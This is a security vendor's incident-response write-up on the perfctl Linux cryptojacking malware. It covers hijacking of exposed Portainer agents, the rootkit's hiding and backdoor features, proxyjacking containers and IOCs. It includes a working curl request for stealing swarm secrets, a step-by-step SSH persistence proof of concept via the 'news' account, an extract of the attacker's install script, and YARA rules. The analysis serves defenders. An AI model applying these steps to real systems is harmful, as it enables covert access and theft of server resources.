---
publisher: "exatrack.com"
title: "Perfctl malware exploiting exposed Portainer agent and using new SSH persistence"
lang: "fr"
url: "https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/"
date: "2024-11-29T00:00:00.000Z"
description: "During an incident response for one of our clients, we stumbled upon a server compromised
by the now relatively documented 1234 perfctl malware."
word_count: 3504
reading_time: "14 min read"
---

## Table of Contents

- [A new initial access method: exploiting unsecured portainer agents](#a-new-initial-access-method-exploiting-unsecured-portainer-agents)
- [perfcc malware](#perfcc-malware)
  - [Finding and analyzing an older variant](#finding-and-analyzing-an-older-variant)
- [Usermode rootkit in action](#usermode-rootkit-in-action)
  - [Exploring an injected /bin/bash](#exploring-an-injected-binbash)
- [Actions on Objectives](#actions-on-objectives)
  - [New persistence](#new-persistence)
- [Conclusion](#conclusion)
- [Annexes](#annexes)
  - [Extract of the malicious Docker installation script](#extract-of-the-malicious-docker-installation-script)
  - [IOC](#ioc)
    - [Hashes](#hashes)
    - [Filenames](#filenames)
    - [Network IOCs](#network-iocs)
    - [Yara rules](#yara-rules)
    - [ATT&CK Techniques used](#attck-techniques-used)
  - [References](#references)
- [Contact us !](#contact-us-)

---

29.11.2024 00:00

During an incident response for one of our clients, we stumbled upon a server compromised by the now relatively documented <sup>[1](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:1)[2](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:2)[3](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:3)[4](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:4)</sup> `perfctl` malware.

While it’s not uncommon to find documented threats during incident responses, we discovered that the attacker used new initial access and persistence methods. In this blogpost we will share the newly uncovered knowledge about the threat actor *Tools Tactics and Procedures*.

To summarize what was known about `perfctl` at the start of the investigation:

- It is a Linux Malware used for monetization of compromised computers by *CryptoJacking* and *ProxyJacking*
- It infects servers via multiple initial access methods including exposed Docker Remote API <sup>[3](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:3)</sup>, use services and cron job for persistence
- It deploys a cryptominer named `perfcc`
- It may lead to an attacker deploying an infostealing payload <sup>[2](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:2)</sup>
- Lastly, it is able to hide many of its actions via a `LD_PRELOAD` library injection as well as `$PATH` hijacking with custom tools for commands like `top`, `strace` or `crontab`.

During our investigation, we could confirm all above points, but also discovered new TTPs of the attacker that were not documented before:

- It also exploits exposed *Portainer agents*
- It may backdoor existing account on the server to enable `SSH` access
- The attacker also installs a docker service in order to run *ProxyJacking* containers

Finally, we managed to find older binaries using similar techniques and filenames, which indicates that this threat actor is probably active since at least three years.

## A new initial access method: exploiting unsecured portainer agents

Several initial access methods are already documented for this malware:

- The exploitation of misconfigured *RocketMQ* services is documented by Aquasec <sup>[1](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:1)</sup>
- The abuse of *Exposed Docker Remote API* is documented by TrendMicro <sup>[3](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:3)</sup>
- The abuse of *Selenium Grid* is also documented by CADO security <sup>[4](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:4)</sup>

In our case, none of the documented services were exposed, and the *Docker* API was listening exclusively on a local Unix Domain Socket.

However, the exploits logs matched almost perfectly the attack sequence documented by TrendMicro <sup>[3](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:3)</sup>, as we discovered a service named `KubeUpdate` making an appearance at the time of compromise. Other elements as well pointed to Docker as an entry point for the attacker.

What we discovered is an abuse of badly secured Portainer agents<sup>[5](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:5)</sup> that were exposed on the internet.

Portainer allows remote managing of Kubernetes or Docker clusters. It is based on a server/agent architecture where the server registers with the agents and is then able to query them for information and send commands to act on the containers on the server where the agent is running.

![a simple explanation of portainer](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/img/portainer_explained.png)

a simple explanation of portainer

The port `9001` of the Portainer agent is used by the server to talk to the agent via an API. The registration process involves the server sending its public key and a signature in the `X-Portaineragent-Publickey` and `X-Portaineragent-Signature` headers. Once the server is registered, the agent will only accept commands signed by this first `X-Portaineragent-Publickey`.

By default, the `X-Portaineragent-Signature` header is a signature of the string `Portainer-App`, an option must be provided to change this shared secret. What is really important (and documented)<sup>[6](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:6)</sup> is that this registration does not persist across reboots of the portainer agent. This effectively means that a portainer agent with its port `9001` exposed may be taken over after a reboot if an attacker connects before the legitimate Portainer server.

Once a malicious `X-Portaineragent-Publickey` is registered as the Portainer server, the available API almost match the standard Docker API, as Portainer Agent mainly works as a proxy for the Docker API.

For example, the secrets of the docker swarm may be retrieved by the following query:

```bash
curl -i --insecure -H "X-Portaineragent-Publickey: $(cat portainer_pubkey.txt)" -H "X-Portaineragent-Signature: $(cat portainer_sign.txt)" https://TARGET:9001/secrets
```

Moreover, the endpoint `https://TARGET:9001/containers/NAME/exec` could be used to exec commands and so on. With this pairing done, an exploitation of Docker API like the one described by TrendMicro is made possible.

## perfcc malware

The main malware installer, stored in `/bin/perfcc` is the same between our incident and the public reports <sup>[1](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:1)</sup> <sup>[3](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:3)</sup> <sup>[2](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:2)</sup>.

It is an ELF binary, packed with a modified UPX<sup>[7](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:7)</sup> packer replacing the standard `UPX!` headers by `\x17\x18\xfd\xce`.

We tried to statically unpack the binary, and during this process we found some oddities when looking a hexadecimal dump of the payload:

![encrypted_payload](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/img/encrypted_payload.png)

encrypted_payload

As UPX is a compressing tool, such bytes repetition should have a very low probability, and we guessed that the malware stored data encrypted with a simple XOR key of `0xCA`. We proceeded to decrypt the file, which proved that the `perfcc` installer stored several encrypted ELF binaries inside it.

```bash
➜  perfcc  binwalk 22e4a57ac560ebe1eff8957906589f4dd5934ee555ebcc0f7ba613b07fad2c13_dec_ca
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
7213330       0x6E1112        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7247570       0x6E96D2        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7263090       0x6ED372        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7278610       0x6F1012        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7294162       0x6F4CD2        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7309778       0x6F89D2        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7357266       0x704352        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7373170       0x708172        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7489810       0x724912        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
7547122       0x7328F2        SHA256 hash constants, little endian
```

The stored binaries are:

- The SUID backdoor later dropped as `wizlmsh`. This binary expects a password as first argument (which MD5 hash must be `abc185c6a7d34354515a3fc2337a2efe`, and then executes a shell with elevated privileges. It should be noted that this binary is stored with the `setuid` bit set, ensuring root privileges for the attacker.
- Several utilities such as `top`, `ldd`, compiled using a modified `SHC`<sup>[8](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:8)</sup> tool, probably to evade signature detection
- The `libgcwrap.so` userland rootkit

Dumping the unpacked binary<sup>[9](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:9)</sup>, while not preserving the original file structure, allowed us to prove that this malware is an obfuscated Go binary, embedding a communication library using `Tor`.

The dropped binaries are also timestomped in order to mimic timestamps of legitimate files.

### Finding and analyzing an older variant

During the investigation, we searched for malicious files using similar methods or filenames as `perfcc`, and found several matching our rules:

- `b197e84c0948151f81abb6eb88de33f49ef904ac0ccb43c55375810d8913d706`, submitted in the end of 2021 on VirusTotal
- `4d0867c87951125d9c980bd96853bb032dd3b299798646a09308942e4987165f`, submitted in the end of 2021
- `d9eb6f401544377511ca03f19442a4680feed39c971b6bcbec2ab341b4fb4645`, also submitted in the end of 2021

After unpacking them (much easier than the latest version), we could analyze these samples and found the following information:

- The malware is implemented in Go, and makes use of the `Emp3ror`<sup>[10](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:10)</sup> post-exploitation framework
- It is highly probable that these two samples are related to `perfctl`, because they use common paths and filenames not found in a pristine `Emp3ror` payload.
- The attacker also left the Go symbols in the older binaries, thus greatly easing the process of reverse engineering

The following functions were defined for the `d9eb6f401544377511ca03f19442a4680feed39c971b6bcbec2ab341b4fb4645` implant:

```
main.CopyToNew
main.forkmeh_default
main.forkmeh_mimick
main.Restart
main.WatchLogins
main.StartX // This function launches the miner
main.StopX
main.FileContainsString
main.AddToProfile
main.CronSystemWideDaily
main.CronSystemWideCrond
main.DeleteCron
main.CopyToUserHome
main.UserCron
main.CreateCronJob
main.main
main.socketListen
main.server
main.bootTor
main.isOnionReachable
main.isLocalHSreachable
main.forwarder
main.forwardConnection
main.connectAltHome
```

Some of the common paths and filenames between this sample and the newer one are the followings:

- `/tmp/.xdiag/hs.txt`, `/tmp/.xdiag/tordata` and `/tmp/.xdiag/hroot` used in `main.bootTor`.
- `/etc/cron.d/perfclean` used in `main.CronSystemWideCrond`.
- `/.config/cron/perfcc` used in `main.AddToProfile`
- `/tmp/.perf.c` used in `main.CopyToNew`
- `(crontab -l|grep -v -e perfcc -e /tmp/.perf;echo '11 * * * * ` used in `main.UserCron`
- `/tmp/.xdiag/p` and several others used in `main.main`

There is also several differences between the older samples and the newer ones:

- The sample `b197e84c0948151f81abb6eb88de33f49ef904ac0ccb43c55375810d8913d706` did not implement functionalities related to the `perfcc` miner, suggesting it could have been either a test implant, or an implant deployed together with a miner by another dropper.
- None of the older samples included the `LD_PRELOAD` userland rootkit, suggesting it was added later by the attacker.

These different samples show that the attacker is probably active since at least 3 years, and is improving its capabilities by adding features to its implants, such as a better packing or the userland rootkit described in the next section.

## Usermode rootkit in action

The malware automatically drops a userland rootkit in the file `/lib/libgcwrap.so`, and ensures that this library is loaded in each new process by hijacking the dynamic linker by writing the path in the `/etc/ld.so.preload` configuration file.

As documented by Aquasec <sup>[1](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:1)</sup>, this rootkit hooks several legitimate functions such as `open`, `read`, `pcap_loop`, …

Most of these functions are quite simple, they check if the `AAZHDE` environment variable is set, and if not it blocks the listing and reading of any folder / filename containing one of the following terms: `.xdiag;.perf.c;.dmesg;perfctl;perfcc;libgcwrap.so;ld.so.preload;libfsnldev.so;libpprocps.so;wizlmsh`

The rootkit also implements several functionalities which were not yet documented:

- It modifies some `ptrace` syscalls
- It modifies the CPU and usage information (in `/proc/PID/stat` for example) by replacing them with random values
- It implements an authentication backdoor for `PAM` modules (it checks for a hashed password of `378ab0e0862bbae881da4fbbeb71e8916f3dc771edb44161c2a63a626c966419` in `pam_authenticate`)
- If the normal PAM logins are successful, the corresponding login and password will be stored in a XOR encrypted file in the `/tmp/.xdiag/data/pam` folder
- It implements a passive backdoor in the `accept` function, if the attacker sends data corresponding to the SHA256 hash `2d7472aa3a35efed7d96d0abb6c1209f7adc46ac837517787d8a7ef0500bf183` it will then respond by sending the string `Welcome back, friend.` and binding the socket to a `bash` shell
- There is also a keylogging functionality when opening `/dev/tty*` files, the results of the TTY sessions are stored XOR encrypted in the `/tmp/.xdiag/data/tty/` folder. Each session is stored in a file named `%s.%d.%d.%d.%d.txt` with the corresponding program name, timestamp, uid, gid and sid

### Exploring an injected /bin/bash

While `perfctl` lives in an environment with multiple binaries, it is possible to test the effect of the `/lib/libgcwrap.so` alone by using `LD_PRELOAD`. The capabilities of the userland rootkit to hide some files and directories can be directly observed in a `bash` session.

The commands and output below reproduce an exchange with a sysadmin to retrieve some critical `perfctl` logs during our investigations.

```bash
user@TestVM:~/Documents$ ls # a copy of perfctl's injected .so
perfctl_libwrap.so
# Emulate perfctl data storage
# This directory will be hidden by perfctl as it contains ".xdiag"
user@TestVM:~/Documents$ mkdir data.xdiag
# Write some file in the fake perfctl directory
user@TestVM:~/Documents$ echo perfctl_data > data.xdiag/log.txt
# The data.xdiag directory is visible in a non injected process
user@TestVM:~/Documents$ ls
data.xdiag  perfctl_libwrap.so
# Enter an injected /bin/bash using LD_PRELOAD
user@TestVM:~/Documents$ LD_PRELOAD=/home/user/Documents/perfctl_libwrap.so /bin/bash
# Copying the directory / Reading the files is impossible
user@TestVM-INJECTED:~/Documents$ ls
file.txt
user@TestVM-INJECTED:~/Documents$ cat data.xdiag/log.txt
cat: data.xdiag/log.txt: No such file or directory
user@TestVM-INJECTED:~/Documents$ cp -r data.xdiag copy
cp: cannot stat 'data.xdiag': No such file or directory
# Going into data.xdiag is possible
user@TestVM-INJECTED:~/Documents$ cd data.xdiag
user@TestVM-INJECTED:~/Documents/data.xdiag$ pwd
/home/user/Documents/data.xdiag
user@TestVM-INJECTED:~/Documents/data.xdiag$ ls -las
ls: cannot access '.': No such file or directory
total 4
? d????????? ? ?    ?       ?            ? .
4 drwxr-xr-x 3 test test 4096 Dec 11 04:12 ..
# Use of busybox to explore the directory
# Busybox is not impacted as it is statically linked
test@test-Virtual-Machine:~/Documents$ ldd /bin/busybox
        not a dynamic executable
user@TestVM-INJECTED:~/Documents/data.xdiag$ /bin/busybox ls
file2.txt  log.txt
user@TestVM-INJECTED:~/Documents/data.xdiag$ /bin/busybox cat log.txt
perfctl_data
user@TestVM-INJECTED:~/Documents/data.xdiag$ cd ..
# Busybox is also able to see the file, as the process is not injected
user@TestVM-INJECTED:~/Documents$ /bin/busybox ls
data.xdiag          file.txt            perfctl_libwrap.so
user@TestVM-INJECTED:~/Documents$ ls
file.txt
```

As demonstrated, `busybox` being a statically linked binary allows exploring and retrieving the `perfctl` data on a live compromised system.

During our investigation, this method allowed us to retrieve key information about the malware.

Luckily, our [Linux forensic collect agent (French link)](https://exatrack.com/recherche_compromission.html)<sup>[11](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:11)</sup> is also statically linked, allowing us to identify the malware almost instantly.

## Actions on Objectives

Most of the attacker’s Actions on Objective are already documented, such as *CryptoJacking* and *ProxyJacking* <sup>[1](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:1)</sup> <sup>[3](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:3)</sup>, and also stealing possible sensitive information <sup>[2](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fn:2)</sup>.

During our incident response, we encountered all these techniques:

- The attacker installed proxyjacking tools
- The attacker collected shell histories, configuration files and command lines possibly containing sensitive information

We also noticed the attacker launching a script for installing a custom `containerd` service using a `base64` decoded payload.

This `containerd` service is then used to launch several *ProxyJacking* containers such as:

- `bitping/bitpingd`
- `repocket/repocket`
- `earnfm/earnfm-client`
- `iproyal/pawns-cli`
- A custom container based on the `debian:buster` image, which downloads and execute the `speedshare.app` payload

### New persistence

During our incident response, we observed the attacker making a set of modifications allowing them to come back via SSH without creating a new account. This method relied on the `news` account existing on standard Linux.

On a fresh *Debian* install, its `/etc/passwd` entry is: `news:x:9:9:news:/var/spool/news:/usr/sbin/nologin`

The modifications made by the attacker are the following:

- Create `/var/spool/news/.ssh/authorized_keys` containing the attacker public-key
- Make a copy of `/bin/dash` as `/usr/sbin/nologin ` (with a trailing space)
- Modify `/etc/shells` to include `nologin ` (with a trailing space)
- Add a space at the end of `news` line in `/etc/passwd`

This effectively changes the `news` shell from `nologin` to `nologin ` and thus `/bin/dash`.

These modifications allow the threat actor to come back using *SSH* with the `news` account.

A Proof of Concept of the process can be found below:

```console
# Proof that 'news' cannot SSH
┌──(root㉿COMPUTER)-[~]
└─# ssh news@localhost
news@localhost's password:
Permission denied, please try again.
[...]
# Check 'news' line in '/etc/passwd'
┌──(root㉿COMPUTER)-[~]
└─# cat /etc/passwd | grep 'news'
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# Drop the SSH key in the newly created home
┌──(root㉿COMPUTER)-[~]
└─# mkdir -p /var/spool/news/.ssh
┌──(root㉿COMPUTER)-[~]
└─# cp /root/.ssh/id_ed25519.pub /var/spool/news/.ssh/authorized_keys
# Try SSH: it works but '/usr/sbin/nologin' tells us:
# This account is currently not available.
┌──(root㉿COMPUTER)-[~]
└─# ssh news@localhost
[...]
This account is currently not available.
Connection to localhost closed.
# Create 'nologin '
┌──(root㉿COMPUTER)-[~]
└─# cp /bin/dash '/usr/sbin/nologin '
# Still nothing
┌──(root㉿COMPUTER)-[~]
└─# ssh news@localhost
[...]
Last login: Fri Nov 29 15:48:28 2024 from 127.0.0.1
This account is currently not available.
Connection to localhost closed.
# Add a space at the end of the line in '/etc/passwd'
# to change effective shell to '/usr/sbin/nologin '
┌──(root㉿COMPUTER)-[~]
└─# sed -i /etc/passwd -e 's$news:x:9:9:news:/var/spool/news:/usr/sbin/nologin$news:x:9:9:news:/var/spool/news:/usr/sbin/nologin $'
# SSH \o/
┌──(root㉿COMPUTER)-[~]
└─# ssh news@localhost
[...]
Last login: Fri Nov 29 15:48:53 2024 from 127.0.0.1
$ whoami
news
$
Connection to localhost closed.
# Remove the space
┌──(root㉿COMPUTER)-[~]
└─# sed -i /etc/passwd -e 's$news:x:9:9:news:/var/spool/news:/usr/sbin/nologin $news:x:9:9:news:/var/spool/news:/usr/sbin/nologin$'
# Does not work anymore
┌──(root㉿COMPUTER)-[~]
└─# ssh news@localhost
[...]
This account is currently not available.
Connection to localhost closed.
```

## Conclusion

While `perfctl` is an already documented malware, this blogpost aimed to show that there can always be new elements to be found during an investigation.

The threat actor behind this malicious is are showing creativity by exploiting multiple exposed services, and is both financially profiting from using the resources of the compromised and stealing sensitive data.

This analysis also shows that a noisy threat actor who doesn’t fit the profile for a state actor can nevertheless demonstrate advanced capabilities and persistence against a wide range of targets.

## Annexes

### Extract of the malicious Docker installation script

```bash
# Launching of the repocket container
_start_rpk(){
[...]
  if _proc_env RP_API_KEY ;then
    echo "rpk already running"
    return
  fi
  if ! _is_inside_container ;then
    if docker -H $DKSKF images|grep -q repocket;then
      if ! docker -H $DKSKF inspect repocket/repocket|grep -q 'sha256:77593eb24b7162a9f7cee2ae058089e432e97fb8478b6821654269223298f26a';
      then
        docker -H $DKSKF pull repocket/repocket:latest
      fi
    fi
    if ! _hasc "repocket.*rpk" "rpk";
      then
      docker -H $DKSKF run -d --rm -e RPKUV=5 -e AAZHDE=1 -e RP_EMAIL=web3evo@protonmail.com -e RP_API_KEY=REDACTED-ATTACKER-KEY-da9d8d4c --name rpk repocket/repocket:latest
      echo "dk RPK run"
    else
      echo "rpk already running"
    fi
  else
    echo "noimpl"
  fi
}
[...]
# Part of the containerd installation
mkdir -p /bin/wbin/run /bin/wbin/data /bin/wbin/exec /bin/wbin/vol /bin/wbin/contd/run
cfgpath="/bin/wbin/contd/config.toml"
rm -rf $cfgpath
if _proc_name_ps 'container.* config default';then
  ps axjf|grep 'container.* config default'|grep -v grep|awk '{print $2}'|xargs kill -9
fi
timeout 10 containerd config default > $cfgpath || timeout 10 docker-containerd config default > $cfgpath
if [ ! -s $cfgpath ];then
  echo "could not write default contd config"
  _nodock_fallback_2
  exit
fi
sed -i 's;root = "/.*"$;root = "/bin/wbin/contd";' $cfgpath
sed -i 's;state = "/.*"$;state = "/bin/wbin/contd/run";' $cfgpath
sed -i 's;address = "/.*\.sock";address = "/bin/wbin/contd/run/containerd.sock";' $cfgpath
export PATH=/bin/wbin:$PATH
export AAZHDE=1
[...]
echo "- starting CONTAINERD"
ln -s /bin/wbin/docker-containerd-shim /bin/wbin/containerd-shim
if _cx containerd &>/dev/null;then
  nohup containerd --config=$cfgpath &>/dev/null &
elif _cx docker-containerd &>/dev/null;then
  nohup docker-containerd --config=$cfgpath &>/dev/null &
else
  echo "contd binary not found"
  _nodock_fallback_2
  exit
fi
```

### IOC

#### Hashes

| SHA256                                                             | FileType       | Comment                                                                                |
| ------------------------------------------------------------------ | -------------- | -------------------------------------------------------------------------------------- |
| `e16fb2a22fce5241565784b5a8518ed2becc9948d4c398093edbb70a946f9331` | ELF executable | Cryptominer                                                                            |
| `a6d3c6b6359ae660d855f978057aab1115b418ed277bb9047cd488f9c7850747` | ELF executable | `LD_PRELOAD` userland rootkit                                                          |
| `f4eaa0890a404bf12ef584259602163b58a07929a2f03bbb8145b665cd51b9e4` | ELF executable | `LD_PRELOAD` userland rootkit                                                          |
| `b11f9ffa2089555db8750dd3bed229419b0e72e9e52d9fc9353d3096a718f310` | ELF executable | `LD_PRELOAD` userland rootkit                                                          |
| `69de4c062eebb13bf2ee3ee0febfd4a621f2a17c3048416d897aecf14503213a` | ELF executable | `LD_PRELOAD` userland rootkit                                                          |
| `be4ba7e3fd253145fa175cd9389902b0cef3796c55f379c475978da3237a1fa9` | ELF executable | `LD_PRELOAD` userland rootkit                                                          |
| `d46ef6fe308084c60fbbca6b22c324bb8e0beb355115ec9212be64cde0e5808c` | Text file      | Systemd timer persistence file                                                         |
| `9d113848aafa9670100d9973963de30b1cc56f3ec465318d29c80b09384fdd70` | Text file      | Systemd service persistence file                                                       |
| `5d84e63927fda2949bbf96f2e8a4797233a20e1bb30943594cb29ac60136131c` | shell script   | Cron persistance                                                                       |
| `8d26984595f0389f8dadb40a898da840c77a7f23d081e88076338422d58e425d` | shell script   | Malicious script used for installation                                                 |
| `83224c33694c1393721f79bb4233ceadb17856256289f02d54af588692e4668f` | shell script   | Malicious script used for installation                                                 |
| `fa9599530f1614e4bc9e1294876b8f1140aa373eab582951c511de65a2e18a7d` | shell script   | Malicious script used for installation                                                 |
| `22e4a57ac560ebe1eff8957906589f4dd5934ee555ebcc0f7ba613b07fad2c13` | ELF executable | Malware main file \[^perfctl_trend\]                                                   |
| `31ee4c9984f3c21a8144ce88980254722fd16a0724afb16408e1b6940fd599da` | ELF executable | Compiled shell script executing “top” but hiding the malicious processes               |
| `c25eaf34008b499d44620e7c73edb052e1d9c8cde30174dce90ac37da5dbc2df` | ELF executable | Compiled shell script executing “strace” but hiding the malicious processes            |
| `21b29b942c2f92b9f63391e50472ef6734aabd358a1da0b250ccd3314b87072c` | ELF executable | Compiled shell script impersonating the `mount` tool and hiding the `/bin/wbin` folder |
| `9a61ee4face85eefbff2e1f66ce2bed035bc7e3bb4829ec2c4dfe4121c1d29a2` | ELF executable | Compiled shell script impersonating the `crontab` tool                                 |
| `db81c115407267801b7c32bd3da0533306c7c586a82839ffe324e8794e3dcc01` | ELF executable | Compiled shell script impersonating the `ldd` tool and hiding the userland rootkit     |
| `1a695a4202ab5d7797f7bbbc434c56775f1524d7622cd54a0bcbf5b032af7e6a` | ELF executable | Compiled shell script impersonating the `lsof` tool and hiding the malware files       |
| `ce3cd079c5cf251798cbc6982308778e6bc6c47a11c8e09c692eea0706e73db2` | ELF executable | Compiled shell script impersonating the `htop` tool                                    |
| `ca3f246d635bfa560f6c839111be554a14735513e90b3e6784bedfe1930bdfd6` | ELF executable | SUID Backdoor ensuring privilege escalation                                            |
| `72e7dd199bed6eefa0ae763c399e0d8a56e2b1dfacc089046706226a5f2aaabf` | ELF executable | Curl utility used to download payloads                                                 |
| `a5d3aaa30cf5c5aee93c4f08a1ffe76dbe647b335bee0d4580a4f5f334a96e31` | ELF executable | `aoip`                                                                                 |
| `17bab9c0b8434a7483c3128ee827b2e02a77a53410b3a7d3e5a0632d71c1606e` | ELF executable | `/dev/shm/libfsnldev.so`                                                               |
| `947ed30792e030849176de18375b41c85a0dcfd0417514412f66e8fa0f6e8a9c` | ELF executable | `/tmp/.perf.c/systemd`                                                                 |
| `cdb338b93fdcff5a5e18348753dd4cfc904b2e619821bd9d29eb6ee2c15e9f4f` | ELF executable | Possibly older version of perfcc                                                       |
| `0ceb6fd8da9641548b0abeba3118936504fdc16e44691e4200e0b796e73e375f` | ELF executable | Older unpacked version, probably uploaded by an analyst                                |
| `b197e84c0948151f81abb6eb88de33f49ef904ac0ccb43c55375810d8913d706` | ELF executable | Possible old version from 2021                                                         |
| `06ba38f40b4f299d6bb7cb282da59f04ac3380fcccef273cf355abb693ebc316` | ELF executable | Possible older version                                                                 |
| `07e1de5fbf257f4cfceaeefed9e451f533d984815f54be30836b2d4d162918ce` | ELF executable | Possible older version                                                                 |
| `4d0867c87951125d9c980bd96853bb032dd3b299798646a09308942e4987165f` | ELF executable | Possible older version                                                                 |
| `ebf431f9a16014a07080abdd42c0492b93074b1517d0cd7a3dd885fe27232925` | ELF executable |                                                                                        |
| `08a7cab8fbb9107108a180c9f7dd8ba6ebc98cbf74f7fdcf0cd60a864457992e` | ELF executable | Older version of the userland rootkit                                                  |
| `cb035f24565fbb4bcea83a55d5993ef545338a8d73d16ed20882a4926058b983` | ELF executable | Older version                                                                          |
| `21842a51653ad0be542f55e47176c551f7adb67ab24a64d8363381a73a192828` | ELF executable | Older version                                                                          |
| `e28a236b0012acd4935b527165278ef90b537f56526b6b07309793d8c0383e6b` | Shell script   | Probably an installation script                                                        |
| `d9eb6f401544377511ca03f19442a4680feed39c971b6bcbec2ab341b4fb4645` | ELF executable | Older version                                                                          |

#### Filenames

| Filename                        | Comment                                                                                  |
| ------------------------------- | ---------------------------------------------------------------------------------------- |
| `libfsnldev.so`                 | Filename found in the rootkit                                                            |
| `libpprocps.so`                 | Filename found in the rootkit                                                            |
| `/bin/perfcc`                   | Main malware installation file                                                           |
| `/bin/wbin/`                    | Path used for installing another `containerd` service, executing proxyjacking containers |
| `/bin/wizlmsh`                  | SUID Backdoor                                                                            |
| `/bin/.local/bin/`              | Path used to store binaries designed to hide the miner                                   |
| `/bin/.atmp/`                   | Path used to store binaries designed to hide the miner                                   |
| `/etc/cron.hourly/perfclean`    | Malicious cron task executing `perfcc`                                                   |
| `/etc/cron.daily/perfclean`     | Malicious cron task executing `perfcc`                                                   |
| `/etc/cron.d/perfclean`         | Malicious cron task executing `perfcc`                                                   |
| `/lib/libgcwrap.so`             | LD_PRELOAD userland rootkit                                                              |
| `/root/.config/cron/perfcc`     | Malicious cron task executing `perfcc`                                                   |
| `/root/.config/traffmonetizer/` | Path probably used by a proxy jacking tool                                               |
| `/tmp/.xdiag`                   | Path used to store malware logs, configuration, and `TTY` session dumps                  |
| `/tmp/ccrl`                     | Path used for a payload in a malicious container                                         |
| `/tmp/gd.sh`                    | script used for docker cleanup after installation                                        |
| `/tmp/.perf.c/`                 | Path used for storing the miner                                                          |
| `/tmp/.perf.c/perfctl`          | Cryptominer                                                                              |
| `/tmp/.apid`                    | File written by the installer                                                            |

#### Network IOCs

| IOC                  | Comment                                                                                |
| -------------------- | -------------------------------------------------------------------------------------- |
| `46.101.139.173`     | IP used for a proxyjacking payload in a container                                      |
| `211.234.111.116`    | Used by the attacker for scanning and exploiting external services \[^perfctlaquasec\] |
| `104.183.100.189`    | Download server \[^perfctlaquasec\]                                                    |
| `198.211.126.180`    | Download server \[^perfctlaquasec\]                                                    |
| `68.183.158.33`      | Download server                                                                        |
| `34.93.41.84`        | Download server                                                                        |
| `bitping.com`        | Used by *Proxyjacking* containers                                                      |
| `earn.fm`            | Used by *Proxyjacking* containers                                                      |
| `repocket.com`       | Used by *Proxyjacking* containers                                                      |
| `api.speedshare.app` | Used by *Proxyjacking* containers                                                      |

#### Yara rules

```yara
rule PwnKit_Exploit_01 {
    meta:
        author = "Exatrack"
        date =   "2024-12-06"
        description = "Detects pwnkit exploit embedded in some perfctl binaries"
        tlp =  "CLEAR"
        source =  "Exatrack"
        sample_hash = "dcd07180b7c48d6c83c6bb8c88ae995a8ab5a8046de1d551c1ead9c29146f99b,44e83f84a5d5219e2f7c3cf1e4f02489cae81361227f46946abe4b8d8245b879"
        ref_url = "https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/"

    strings:
        $str_pwnkit_01 = "Exploit failed. Target is most likely patched." ascii fullword
        $str_pwnkit_02 = "CHARSET=pkexec" ascii fullword
        $str_pwnkit_03 = "SHELL=pkexec" ascii fullword
        $str_pwnkit_04 = ".pkexec/pkexec.so" ascii fullword
        $str_pwnkit_05 = "module UTF-8// PKEXEC// pkexec 2" ascii fullword

    condition:
        3 of them
}

rule PerfCC_Rootkit_01 {
    meta:
        author = "Exatrack"
        date =   "2024-11-13"
        description = "Detects Perfcc libgcwrap.so userland rootkit"
        score =   90
        tlp =  "CLEAR"
        sample_hash = "a6d3c6b6359ae660d855f978057aab1115b418ed277bb9047cd488f9c7850747"
        ref_url = "https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/,https://www.trendmicro.com/en_us/research/24/j/attackers-target-exposed-docker-remote-api-servers-with-perfctl-.html"

    strings:

        // String decryption loop
        $str_decrypt_loop = {48 01 ca 0f b6 12 83 f2 ac}

        $str_01 = "/tmp/.xdiag/" xor
        $str_02 = "/lib/libfsnldev.so" xor
        $str_03 = "/tmp/wttwe" xor
        $str_04 = "PATH=/tmp:$PATH;chmod 777 /tmp" xor
        $str_05 = "libgcwrap.so" xor
        $str_06 = "/lib/libpprocps.so" xor
        $str_07 = "Welcome back, friend." xor

    condition:
        any of them
}

rule PerfCC_Install_Script {
    meta:
        author = "Exatrack"
        date =   "2024-10-23"
        update =   "2024-10-23"
        description = "Detects perfcc related files"
        score =   80
        tlp =  "CLEAR"
